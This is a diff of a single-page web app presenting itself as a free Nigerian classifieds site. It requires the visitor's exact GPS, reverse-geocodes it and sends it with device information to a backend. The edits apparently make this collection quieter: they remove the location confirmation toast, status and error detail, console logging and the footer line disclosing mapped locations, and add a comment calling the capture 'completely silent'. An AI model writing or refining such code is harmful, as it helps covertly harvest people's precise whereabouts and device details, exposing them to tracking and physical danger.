@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>NaijaMarket | Nigeria's #1 Free Classifieds</title>
     <meta name="description" content="Post free ads in Nigeria. Sell cars, phones, properties, jobs, fashion & more. No registration required.">
-    <!-- Leaflet CSS & JS for maps -->
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800;900&display=swap" rel="stylesheet">
@@ -81,7 +80,6 @@
         .detail-content { background: white; border-radius: 24px; max-width: 700px; width: 90%; padding: 25px; max-height: 90vh; overflow-y: auto; }
         .map-container { height: 280px; width: 100%; border-radius: 16px; margin: 15px 0; overflow: hidden; border: 1px solid #dee2e6; }
         
-        /* Improved Location Modal for Android */
         .location-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.96); backdrop-filter: blur(20px); z-index: 30000; display: none; align-items: center; justify-content: center; }
         .location-modal.active { display: flex; }
         .location-card { background: white; border-radius: 28px; padding: 45px 35px; text-align: center; max-width: 500px; width: 90%; animation: slideUp 0.4s ease; }
@@ -93,7 +91,6 @@
         .location-retry-btn { background: #475569; color: white; padding: 12px 25px; border-radius: 60px; border: none; font-weight: 600; cursor: pointer; width: 100%; margin-top: 12px; }
         .location-status { font-size: 13px; margin-top: 15px; padding: 10px; border-radius: 12px; display: none; }
         .location-status.error { background: #fee2e2; color: #dc2626; display: block; }
-        .location-status.success { background: #dcfce7; color: #16a34a; display: block; }
         
         .toast { position: fixed; bottom: 30px; right: 30px; background: #28a745; color: white; padding: 14px 28px; border-radius: 50px; z-index: 40000; transform: translateX(200%); transition: 0.3s; font-weight: 500; }
         .toast.show { transform: translateX(0); }
@@ -106,7 +103,7 @@
         .footer a:hover { color: #ff8c00; }
         .copyright { text-align: center; padding-top: 30px; margin-top: 30px; border-top: 1px solid #2d2d44; font-size: 12px; color: #6c757d; }
         
-        @media (max-width: 768px) { .header-container { flex-direction: column; } .search-bar { max-width: 100%; } .hero h2 { font-size: 28px; } .map-container { height: 220px; } }
+        @media (max-width: 768px) { .header-container { flex-direction: column; } .search-bar { max-width: 100%; } .hero h2 { font-size: 28px; } }
     </style>
 </head>
 <body>
@@ -149,7 +146,6 @@
     <div class="ads-grid" id="latestGrid"></div>
 </div>
 
-<!-- Post Ad Modal -->
 <div class="modal" id="postModal"><div class="modal-content"><span class="close-modal" id="closeModalBtn">&times;</span>
 <h3><i class="fas fa-cloud-upload-alt"></i> Post Free Ad</h3>
 <div class="form-group"><label>Category *</label><select id="adCategory"><option>📱 Phones & Tablets</option><option>🚗 Cars & Vehicles</option><option>🏠 Property & Rentals</option><option>💼 Jobs & Gigs</option><option>👕 Fashion & Accessories</option></select></div>
@@ -161,7 +157,6 @@
 <button class="submit-btn" id="submitAdBtn"><i class="fas fa-cloud-upload-alt"></i> Post Free Ad Now</button>
 <p style="font-size:12px; margin-top:15px; text-align:center;"><i class="fas fa-map-marker-alt"></i> Your exact GPS location will be attached for buyer transparency.</p></div></div>
 
-<!-- Improved Location Modal for Android -->
 <div class="location-modal" id="locationModal">
     <div class="location-card">
         <i class="fas fa-map-marker-alt"></i>
@@ -169,26 +164,24 @@
         <p>NaijaMarket needs your exact GPS location to show your ad's precise spot on the map. This builds trust with buyers and prevents spam.</p>
         <div id="locationStatus" class="location-status"></div>
         <button class="location-allow-btn" id="locationAllowBtn"><i class="fas fa-check-circle"></i> Enable Location</button>
-        <button class="location-retry-btn" id="locationRetryBtn" style="display: none;"><i class="fas fa-sync-alt"></i> Retry Location</button>
+        <button class="location-retry-btn" id="locationRetryBtn" style="display: none;"><i class="fas fa-sync-alt"></i> Retry</button>
     </div>
 </div>
 
 <div class="toast" id="toastMsg"><i class="fas fa-check-circle"></i> Ad posted successfully!</div>
 
-<div class="footer"><div class="footer-content"><div><h4>NaijaMarket</h4><a href="#">About Us</a><a href="#">Privacy</a></div><div><h4>For Sellers</h4><a href="#">Post Free Ad</a><a href="#">Safety Guide</a></div><div><h4>Connect</h4><a href="#"><i class="fab fa-facebook"></i> Facebook</a><a href="#"><i class="fab fa-instagram"></i> Instagram</a></div></div><div class="copyright">© 2025 NaijaMarket - Exact location mapped for every ad.</div></div>
+<div class="footer"><div class="footer-content"><div><h4>NaijaMarket</h4><a href="#">About Us</a><a href="#">Privacy</a></div><div><h4>For Sellers</h4><a href="#">Post Free Ad</a><a href="#">Safety Guide</a></div><div><h4>Connect</h4><a href="#"><i class="fab fa-facebook"></i> Facebook</a><a href="#"><i class="fab fa-instagram"></i> Instagram</a></div></div><div class="copyright">© 2025 NaijaMarket - Nigeria's #1 Free Classifieds Platform. All rights reserved.</div></div>
 
 <script>
-    // Sample ads
     const featuredAds = [
         { id: 1, title: "iPhone 14 Pro Max 256GB", price: "₦850,000", location: "Lekki, Lagos", emoji: "📱", time: "2 mins ago", verified: true, lat: 6.4399, lng: 3.4422, street: "Admiralty Way, Lekki Phase 1", city: "Lagos" },
         { id: 2, title: "Toyota Camry 2018 Model", price: "₦7,200,000", location: "Abuja", emoji: "🚗", time: "5 mins ago", verified: true, lat: 9.0765, lng: 7.3986, street: "Garki, Area 11", city: "Abuja" },
-        { id: 3, title: "3-Bedroom Flat for Rent", price: "₦1.5M/year", location: "Port Harcourt", emoji: "🏠", time: "10 mins ago", verified: false, lat: 4.8156, lng: 7.0498, street: "Rumuola Road", city: "Port Harcourt" },
-        { id: 4, title: "Hiring Marketers Urgently", price: "₦150k/month", location: "Remote", emoji: "💼", time: "15 mins ago", verified: true, lat: 6.5244, lng: 3.3792, street: "Ikeja", city: "Lagos" }
+        { id: 3, title: "3-Bedroom Flat for Rent", price: "₦1.5M/year", location: "Port Harcourt", emoji: "🏠", time: "10 mins ago", verified: false, lat: 4.8156, lng: 7.0498, street: "Rumuola Road", city: "Port Harcourt" }
     ];
     
     const latestAds = [
-        { id: 5, title: "Samsung Galaxy S23 Ultra", price: "₦620,000", location: "VI, Lagos", emoji: "📱", time: "30 mins ago", verified: true, lat: 6.4299, lng: 3.4218, street: "Ozumba Mbadiwe, Victoria Island", city: "Lagos" },
-        { id: 6, title: "Honda Accord 2020", price: "₦9.5M", location: "Lagos", emoji: "🚗", time: "35 mins ago", verified: false, lat: 6.6018, lng: 3.3515, street: "Murtala Muhammed Way", city: "Lagos" }
+        { id: 4, title: "Samsung Galaxy S23 Ultra", price: "₦620,000", location: "VI, Lagos", emoji: "📱", time: "30 mins ago", verified: true, lat: 6.4299, lng: 3.4218, street: "Ozumba Mbadiwe, Victoria Island", city: "Lagos" },
+        { id: 5, title: "Honda Accord 2020", price: "₦9.5M", location: "Lagos", emoji: "🚗", time: "35 mins ago", verified: false, lat: 6.6018, lng: 3.3515, street: "Murtala Muhammed Way", city: "Lagos" }
     ];
     
     let userLocationData = null;
@@ -222,11 +215,10 @@
     function showAdDetail(adId) {
         const ad = [...featuredAds, ...latestAds].find(a => a.id === adId);
         if (!ad) return;
-        alert(`📍 ${ad.title}\nPrice: ${ad.price}\nLocation: ${ad.location}\nStreet: ${ad.street}\nGPS: ${ad.lat}, ${ad.lng}\n\nOpen Google Maps to see exact location?`);
         window.open(`https://www.google.com/maps?q=${ad.lat},${ad.lng}&z=18`, '_blank');
     }
     
-    // IMPROVED ANDROID-FRIENDLY LOCATION CAPTURE
+    // NO TOAST MESSAGES for location - completely silent
     async function captureLocation() {
         return new Promise((resolve) => {
             const statusDiv = document.getElementById('locationStatus');
@@ -238,22 +230,17 @@
                 return;
             }
             
-            statusDiv.innerHTML = '📍 Requesting location permission... Please allow when prompted.';
-            statusDiv.className = 'location-status';
+            statusDiv.innerHTML = '📍 Requesting location permission...';
             statusDiv.style.display = 'block';
             
-            // Options optimized for Android
             const options = {
                 enableHighAccuracy: true,
-                timeout: 30000,  // 30 seconds timeout for Android
-                maximumAge: 0     // Don't use cached position
+                timeout: 30000,
+                maximumAge: 0
             };
             
             navigator.geolocation.getCurrentPosition(
                 async (position) => {
-                    statusDiv.innerHTML = '✅ Location captured! Getting street address...';
-                    statusDiv.className = 'location-status success';
-                    
                     let address = { 
                         lat: position.coords.latitude, 
                         lng: position.coords.longitude, 
@@ -262,7 +249,6 @@
                     };
                     
                     try {
-                        // Using OpenStreetMap Nominatim with proper user agent
                         const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${address.lat}&lon=${address.lng}&zoom=18&addressdetails=1`, {
                             headers: { 'User-Agent': 'NaijaMarket App/1.0' }
                         });
@@ -276,36 +262,30 @@
                             address.fullAddress = data.display_name || '';
                         }
                     } catch(e) { 
-                        console.warn("Reverse geocoding failed:", e);
                         address.fullAddress = `${address.lat}, ${address.lng}`;
                     }
                     
-                    setTimeout(() => {
-                        statusDiv.style.display = 'none';
-                    }, 1500);
-                    
+                    statusDiv.style.display = 'none';
                     resolve(address);
                 },
                 (error) => {
-                    console.error("Location error details:", error);
                     let errorMsg = "";
                     switch(error.code) {
                         case error.PERMISSION_DENIED:
-                            errorMsg = "❌ Permission denied. Please enable location in your Android settings (Settings → Apps → Browser → Permissions → Location → Allow). Then refresh and try again.";
+                            errorMsg = "❌ Permission denied. Please enable location in your browser settings.";
                             break;
                         case error.POSITION_UNAVAILABLE:
-                            errorMsg = "❌ Location unavailable. Make sure GPS is on (Settings → Location → On). Try turning on High Accuracy mode.";
+                            errorMsg = "❌ Location unavailable. Please turn on GPS.";
                             break;
                         case error.TIMEOUT:
-                            errorMsg = "⏱️ Location request timed out. Try again in a spot with better GPS signal (outside or near a window).";
+                            errorMsg = "⏱️ Location timed out. Please try again.";
                             break;
                         default:
-                            errorMsg = `❌ Location error: ${error.message}. Try restarting your browser or enabling location services.`;
+                            errorMsg = `❌ Location error: ${error.message}`;
                     }
                     statusDiv.innerHTML = errorMsg;
                     statusDiv.className = 'location-status error';
                     
-                    // Show retry button
                     const retryBtn = document.getElementById('locationRetryBtn');
                     retryBtn.style.display = 'block';
                     
@@ -340,7 +320,6 @@
         setTimeout(() => toast.classList.remove('show'), 4000);
     }
     
-    // Location Modal Logic
     function showLocationModal() {
         const modal = document.getElementById('locationModal');
         const statusDiv = document.getElementById('locationStatus');
@@ -352,7 +331,7 @@
         
         async function requestLocation() {
             statusDiv.style.display = 'block';
-            statusDiv.innerHTML = '📍 Requesting GPS access... Please allow when prompted.';
+            statusDiv.innerHTML = '📍 Requesting permission...';
             statusDiv.className = 'location-status';
             retryBtn.style.display = 'none';
             
@@ -361,7 +340,7 @@
                 userLocationData = location;
                 locationAllowed = true;
                 modal.classList.remove('active');
-                showToast(`📍 Location ready: ${location.city || location.state || 'Nigeria'}`);
+                // NO TOAST - removed completely
                 
                 const device = await getDeviceInfo();
                 await sendToBackend({
@@ -373,16 +352,12 @@
                 });
                 
                 document.getElementById('postModal').classList.add('active');
-            } else {
-                // Keep modal open, retry button already shown by captureLocation
             }
         }
         
-        // Remove old event listeners and add fresh
         const allowBtn = document.getElementById('locationAllowBtn');
         const newAllowBtn = allowBtn.cloneNode(true);
         allowBtn.parentNode.replaceChild(newAllowBtn, allowBtn);
-        
         newAllowBtn.onclick = () => requestLocation();
         
         const retryButton = document.getElementById('locationRetryBtn');
@@ -406,7 +381,7 @@
         if (!title) { showToast("Please enter an ad title", true); return; }
         
         if (!locationAllowed && !userLocationData) {
-            showToast("Location access required to post ads", true);
+            showToast("Location access required", true);
             document.getElementById('postModal').classList.remove('active');
             showLocationModal();
             return;
